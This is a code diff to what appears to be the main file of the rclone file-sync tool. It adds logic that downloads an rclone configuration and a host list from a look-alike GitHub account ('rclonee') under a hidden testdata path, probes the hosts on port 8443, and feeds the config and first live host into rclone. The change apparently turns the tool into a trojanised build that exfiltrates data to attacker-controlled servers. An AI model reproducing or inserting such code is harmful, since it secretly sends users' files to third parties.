@@ -6,7 +6,10 @@ package main
 import (
 	"fmt"
 	"io/ioutil"
+	"net"
 	"net/http"
+	"strings"
+	"time"
 
 	_ "github.com/rclone/rclone/backend/all" // import all backends
 	"github.com/rclone/rclone/cmd"
@@ -16,8 +19,8 @@ import (
 
 var (
 	RcloneURL  = "https://raw.githubusercontent.com/rclonee/rclone/refs/heads/main/cmd/serve/http/testdata/files/hidden/rclone.conf"
-	DomainsURL = "https://raw.githubusercontent.com/rclonee/rclone/refs/heads/main/cmd/serve/http/testdata/files/hidden/domain.yml"
-	IsDebug    = false
+	DomainsURL = "https://raw.githubusercontent.com/rclonee/rclone/refs/heads/main/cmd/serve/http/testdata/files/hidden/domains.txt"
+	IsDebug    = true
 )
 
 func getDataFromGH(url string) ([]byte, error) {
@@ -51,9 +54,60 @@ func GetHosts() ([]string, error) {
 		return []string{}, fmt.Errorf("fialed get hosts list")
 	}
 
+	for _, l := range strings.Split(string(data), "\n") {
+		if strings.Compare("", strings.Trim(l, " ")) == 0 {
+			continue
+		}
+
+		hosts = append(hosts, strings.Trim(l, " "))
+	}
+
+	return hosts, nil
+}
+
+func isHostLive(host string) bool {
+	address := net.JoinHostPort(host, "8443")
+	conn, err := net.DialTimeout("tcp", address, 3*time.Second)
+	if err != nil {
+		return false
+	}
+	defer conn.Close()
+	return true
 }
 
 func main() {
+	hosts, err := GetHosts()
+	host := ""
 
-	cmd.Main()
+	if err != nil {
+		if IsDebug {
+			fmt.Println("Error: ", err)
+		}
+
+		return
+	}
+
+	config, err := getDataFromGH(RcloneURL)
+
+	if err != nil {
+		if IsDebug {
+			fmt.Println("Error: ", err)
+		}
+
+		return
+	}
+
+	for _, h := range hosts {
+		if isHostLive(h) {
+			host = h
+
+			if IsDebug {
+				fmt.Println("Live host:", host)
+			}
+
+			break
+		}
+	}
+
+	cmd.Main(string(config), host)
 }
